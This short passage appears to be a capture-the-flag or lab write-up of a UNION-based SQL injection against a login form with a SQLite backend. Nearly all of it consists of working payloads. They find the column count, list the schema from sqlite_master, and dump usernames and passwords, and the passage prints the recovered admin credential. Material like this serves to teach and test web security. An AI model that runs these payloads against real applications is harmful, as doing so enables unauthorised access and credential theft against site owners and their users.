Check the number of the collums, the payload success indicating the current table have 2 collums(which is username and password):
```
login=admin&password=a'+union+select+null,+null--
```
The payload
```
'+UNION+SELECT+name,+sql+FROM+sqlite_master--
```
return `users` and `CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)`
```
'+UNION+SELECT+username,password+FROM+users--
```
return `admin` and `t0_W34k!$`